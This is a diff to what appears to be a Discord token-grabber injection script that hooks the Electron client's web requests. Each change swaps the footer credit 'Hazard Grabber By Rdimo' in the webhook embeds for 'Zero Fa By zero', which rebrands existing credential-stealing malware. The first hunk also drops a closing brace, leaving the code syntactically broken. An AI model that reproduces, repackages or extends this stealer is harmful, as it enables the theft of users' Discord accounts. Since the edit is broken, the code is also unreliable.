@@ -215,8 +215,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                    }
+                        "text": "Zero Fa By zero"
                 }
             ]
         }
@@ -272,7 +271,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Zero Fa By zero"
                         }                 
                     }
                 ]
@@ -330,7 +329,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "zero Fa by zero"
                     }                
                 }
             ]
